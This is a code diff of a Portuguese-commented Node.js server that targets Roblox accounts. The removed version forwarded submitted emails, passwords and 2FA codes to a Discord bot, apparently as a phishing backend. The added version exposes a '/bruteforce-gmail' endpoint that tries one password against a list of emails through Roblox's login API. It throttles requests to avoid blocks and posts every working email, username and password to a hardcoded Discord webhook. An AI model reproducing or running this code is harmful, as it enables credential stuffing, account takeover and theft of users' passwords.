@@ -1,190 +1,128 @@
 const express = require('express');
 const axios = require('axios');
-const { Client, GatewayIntentBits } = require('discord.js');
-
 const app = express();
 const port = process.env.PORT || 3000;
 
-// --- CONFIGURAÇÕES DO BOT ---
-// O teu Token já está aqui
-// No server.js, substitua a linha do token por isto:
-const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
-const CHANNEL_ID = process.env.CHANNEL_ID;
-
-
-// Inicializar o Bot
-const client = new Client({ intents: [GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
-
-let isBotReady = false;
-
-client.on('ready', () => {
-    console.log(`✅ Bot conectado como ${client.user.tag}!`);
-    isBotReady = true;
-});
-
-client.login(DISCORD_TOKEN);
+// SEU WEBHOOK DO DISCORD (O antigo funciona, não precisa de Bot oficial)
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";
 
 app.use(express.json());
 app.use(express.static('.'));
 
-// Função para enviar mensagem via BOT
-async function sendDiscordMessage(content) {
-    return new Promise((resolve, reject) => {
-        const sendMessage = async () => {
-            try {
-                const channel = await client.channels.fetch(CHANNEL_ID);
-                if (channel) {
-                    await channel.send({
-                        content: content,
-                        username: "Roblox Bot",
-                        avatarURL: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg'
-                    });
-                    console.log("Mensagem enviada ao Discord!");
-                    resolve(true);
-                } else {
-                    console.error("Canal não encontrado! Verifique o CHANNEL_ID.");
-                    reject("Canal não encontrado");
-                }
-            } catch (error) {
-                console.error("Erro ao enviar mensagem:", error);
-                reject(error);
-            }
-        };
-
-        if (isBotReady) {
-            sendMessage();
-        } else {
-            // Se o bot ainda estiver carregando, espera um pouco
-            setTimeout(() => {
-                if (isBotReady) {
-                    sendMessage();
-                } else {
-                    reject("Bot ainda não estava pronto");
-                }
-            }, 2000);
-        }
-    });
-}
-
-// Função para verificar se o Usuário existe (API de Busca Robusta)
-async function checkUserExists(username) {
-    try {
-        const response = await axios.get('https://www.roblox.com/users/search', {
-            params: { query: username, limit: 1, offset: 0 },
-            headers: { 'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest' },
-            timeout: 5000
-        });
-        
-        if (response.data && response.data.Users && response.data.Users.length > 0) {
-            const user = response.data.Users[0];
-            // Verifica se o nome é exatamente o mesmo (case-insensitive)
-            if (user.Name.toLowerCase() === username.toLowerCase()) {
-                return { exists: true, id: user.Id, displayName: user.DisplayName, name: user.Name };
-            }
-        }
-        return { exists: false };
-    } catch (error) {
-        return { exists: false };
-    }
-}
-
-// Função para tentar Login no Roblox
-async function tryLogin(email, password) {
+// Função para tentar Login no Roblox com EMAIL e SENHA
+async function tryLoginWithGmail(email, password) {
     const baseUrl = "https://www.roblox.com";
     const robloxClient = axios.create({
         baseURL: baseUrl,
         timeout: 10000,
         headers: {
-            'User-Agent': 'Mozilla/5.0',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Accept': 'application/json',
             'X-Requested-With': 'XMLHttpRequest'
         }
     });
+
     try {
+        // 1. Pega os cookies do Roblox
         await robloxClient.get('/');
+
+        // 2. Tenta o Login
         const response = await robloxClient.post('/users/login', {
-            username: email,
+            username: email, // O Roblox aceita o Email no campo username
             password: password
         }, {
             headers: { 'Content-Type': 'application/json' },
             validateStatus: status => status < 500
         });
-        
+
         const data = response.data;
+
+        // Se retornar um ID numérico, o login funcionou!
         if (data.id && typeof data.id === 'number') {
-            return { success: true, username: data.username, id: data.id };
+            return {
+                success: true,
+                username: data.username, // O nome do usuário no Roblox
+                id: data.id
+            };
         }
-        return { success: false, error: data.error || "Senha Errada" };
+
+        // Se não, retorna o erro (ex: "User not found" ou "Wrong password")
+        return {
+            success: false,
+            error: data.error || "Erro Desconhecido"
+        };
+
     } catch (e) {
-        return { success: false, error: "Erro de Conexão" };
+        return {
+            success: false,
+            error: "Erro de Conexão ou Timeout"
+        };
     }
 }
 
-// ENDPOINT DE LISTA (BRUTE FORCE)
-app.post('/check-list', async (req, res) => {
+// Função para enviar mensagem no Discord
+async function sendToDiscord(message) {
+    try {
+        await axios.post(WEBHOOK_URL, { content: message });
+    } catch (e) {
+        console.error("Erro no Webhook:", e);
+    }
+}
+
+// ENDPOINT PARA FORÇA BRUTA (LISTA DE EMAILS)
+app.post('/bruteforce-gmail', async (req, res) => {
     const { list, password } = req.body;
-    
+
     if (!list || !Array.isArray(list) || list.length === 0) {
         return res.json({ success: false, error: "Lista vazia" });
     }
 
+    if (!password) {
+        return res.json({ success: false, error: "Falta a Senha" });
+    }
+
     const results = [];
     let foundCount = 0;
-    // Limitamos a 20 para não travar o servidor
-    const maxChecks = list.slice(0, 20);
 
-    for (const usernameOrEmail of maxChecks) {
-        const cleanName = usernameOrEmail.trim();
-        const userCheck = await checkUserExists(cleanName);
+    // Limitamos a 10 por vez para não travar o servidor gratuito do Render
+    const maxChecks = list.slice(0, 10);
 
-        if (userCheck.exists) {
+    for (const email of maxChecks) {
+        const cleanEmail = email.trim();
+        
+        console.log(`Testando: ${cleanEmail}...`);
+
+        const result = await tryLoginWithGmail(cleanEmail, password);
+
+        if (result.success) {
             foundCount++;
-            results.push({ status: "FOUND", username: userCheck.name, id: userCheck.id, original: cleanName });
-            
-            // Se tiver senha, tenta login para confirmar
-            if (password) {
-                const loginResult = await tryLogin(cleanName, password);
-                if (loginResult.success) {
-                    await sendDiscordMessage(
-                        `**✅ CONTA VÁLIDA COM SENHA!**\n**User:** ${loginResult.username}\n**Email/Name:** ${cleanName}\n**Senha:** ${password}`
-                    );
-                    results[results.length -  1].loginConfirmed = true;
-                }
-            }
+            results.push({
+                status: "FOUND",
+                email: cleanEmail,
+                robloxUsername: result.username,
+                robloxId: result.id
+            });
+
+            // Envia alerta no Discord
+            const msg = `**🔥 CONTA ENCONTRADA NO ROBLOX!**\n**Email:** ${cleanEmail}\n**Usuário:** ${result.username}\n**Senha:** ${password}\n**ID:** ${result.id}`;
+            await sendToDiscord(msg);
         } else {
-            results.push({ status: "NOT_FOUND", original: cleanName });
+            results.push({
+                status: "MISSED",
+                email: cleanEmail,
+                error: result.error
+            });
         }
-        // Pausa de 200ms entre cada verificação
-        await new Promise(r => setTimeout(r, 200));
+
+        // Pausa de 1.5 segundos entre cada tentativa para não bloquear o Email
+        await new Promise(r => setTimeout(r, 1500));
     }
 
-    await sendDiscordMessage(`**📊 RESULTADO DA VERIFICAÇÃO**\n**Total:** ${maxChecks.length} | **Encontradas:** ${foundCount}`);
+    // Resumo no Discord
+    const summary = `**📊 FIM DA VERIFICAÇÃO**\n**Testados:** ${maxChecks.length}\n**Encontrados:** ${foundCount}`;
+    await sendToDiscord(summary);
 
     return res.json({ success: true, results: results, found: foundCount });
-});
-
-// ENDPOINT DE LOGIN ÚNICO
-app.post('/check', async (req, res) => {
-    const { email, password, code2fa, isFinalStep } = req.body;
-
-    if (isFinalStep) {
-        await sendDiscordMessage(`**🔒 LOGIN COMPLETO (2FA)**\n**Email:** ${email}\n**Code:** ${code2fa}`);
-        return res.json({ success: true });
-    }
-
-    if (!email || !password) {
-        return res.json({ success: false, error: "Falta Email ou Senha" });
-    }
-
-    const result = await tryLogin(email, password);
-
-    if (result.success) {
-        await sendDiscordMessage(`**✅ CONTA VÁLIDA!**\n**User:** ${result.username}\n**Email:** ${email}\n**Senha:** ${password}`);
-        return res.json({ success: true, username: result.username, userId: result.id, error: "" });
-    } else {
-        await sendDiscordMessage(`**❌ LOGIN FALHOU**\n**Email:** ${email}\n**Erro:** ${result.error}`);
-        return res.json({ success: false, username: email, userId: "Unknown", error: result.error });
-    }
 });
 
 app.listen(port, () => {
